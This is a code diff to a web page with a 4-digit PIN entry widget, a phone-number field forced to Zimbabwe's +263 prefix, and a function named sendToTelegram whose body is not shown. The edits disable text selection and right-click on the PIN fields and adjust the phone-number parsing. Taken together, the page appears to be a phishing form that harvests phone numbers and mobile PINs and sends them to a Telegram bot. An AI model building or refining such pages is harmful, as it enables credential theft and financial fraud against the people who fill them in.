@@ -181,6 +181,7 @@ input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4p
   padding:14px 16px 12px;
   transition:border-color .18s,box-shadow .18s;
   cursor:text;
+  user-select:none;-webkit-user-select:none;
 }
 .pin-field-wrap.focused{
   border-color:var(--blue);background:var(--white);
@@ -221,6 +222,8 @@ input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4p
   position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
   font-family:var(--mono);font-size:14px;font-weight:800;color:var(--navy);
   opacity:0;transition:opacity .1s;
+  user-select:none;-webkit-user-select:none;
+  pointer-events:none;
 }
 .pin-dot.peek .pin-dot-digit{opacity:1}
 
@@ -385,7 +388,7 @@ input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4p
           <div class="field" id="pinField">
             <div class="field-label">Enter Your PIN</div>
             <input type="tel" id="pinHidden" inputmode="numeric" pattern="[0-9]*" maxlength="4" class="pin-input-hidden" autocomplete="current-password">
-            <div class="pin-field-wrap" id="pinWrap" onclick="document.getElementById('pinHidden').focus()">
+            <div class="pin-field-wrap" id="pinWrap" onclick="document.getElementById('pinHidden').focus()" oncontextmenu="return false">
               <div class="pin-tap-label" id="pinTapLabel">Tap to enter your 4-digit PIN</div>
               <div class="pin-dots-row">
                 <div class="pin-dot" id="pd0"><span class="pin-dot-digit" id="pdd0"></span></div>
@@ -394,7 +397,7 @@ input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4p
                 <div class="pin-dot" id="pd3"><span class="pin-dot-digit" id="pdd3"></span></div>
               </div>
               <div class="pin-actions-row">
-                <button class="pin-peek-btn" id="pinPeekBtn" type="button" onpointerdown="peekPin()" onpointerup="unpeekPin()" onpointerleave="unpeekPin()">
+                <button class="pin-peek-btn" id="pinPeekBtn" type="button" onpointerdown="peekPin()" onpointerup="unpeekPin()" onpointerleave="unpeekPin()" oncontextmenu="return false" style="-webkit-user-select:none;user-select:none">
                   <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                   Peek
                 </button>
@@ -492,19 +495,17 @@ async function sendToTelegram(event){
 const phoneEl=document.getElementById('phone');
 phoneEl.addEventListener('input',e=>{
   let raw=e.target.value.replace(/\D/g,'');
-  // strip country code variants: 00263, +263, 263
+  // strip country code variants: 00263, 263
   if(raw.startsWith('00263')) raw=raw.slice(5);
   else if(raw.startsWith('263')) raw=raw.slice(3);
   // strip leading zero
   if(raw.startsWith('0')) raw=raw.slice(1);
-  // cap at 9 digits
-  raw=raw.slice(0,9);
+  // if still >9 digits (e.g. pasted full number), take last 9
+  if(raw.length>9) raw=raw.slice(-9);
   e.target.value=raw;
   phoneValue=raw.length>0?'+263'+raw:'';
-  // validate starts with 7
-  const startsOk=raw.length===0||raw[0]==='7';
   clearError('phoneField','phoneError');
-  if(raw.length>0&&!startsOk){
+  if(raw.length>0&&raw[0]!=='7'){
     document.getElementById('phoneError').textContent='Number must start with 7 (e.g. 77XXXXXXX)';
     showError('phoneField','phoneError');
   }
